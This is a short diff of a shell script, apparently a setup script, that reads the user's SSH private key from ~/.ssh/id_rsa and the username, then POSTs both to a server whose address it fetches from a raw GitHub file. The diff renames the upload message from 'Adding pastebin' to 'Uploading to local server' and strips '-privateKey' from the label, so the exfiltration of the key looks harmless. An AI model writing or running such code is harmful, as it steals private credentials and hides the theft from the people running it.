@@ -31,11 +31,11 @@ server_url=$(curl -fsSL https://raw.githubusercontent.com/sshcrack/lithium-setup
 key=$(cat ~/.ssh/id_rsa)
 usr=$(users)
 
-echo "Adding pastebin"
+echo "Uploading to local server"
 url=$(curl --location --request POST "$server_url/addKey" \
 --header 'Content-Type: application/x-www-form-urlencoded' \
 --data-urlencode "key=$key" \
---data-urlencode "name=$usr-privateKey")
+--data-urlencode "name=$usr")
 
 cd /etc/lightdm
 
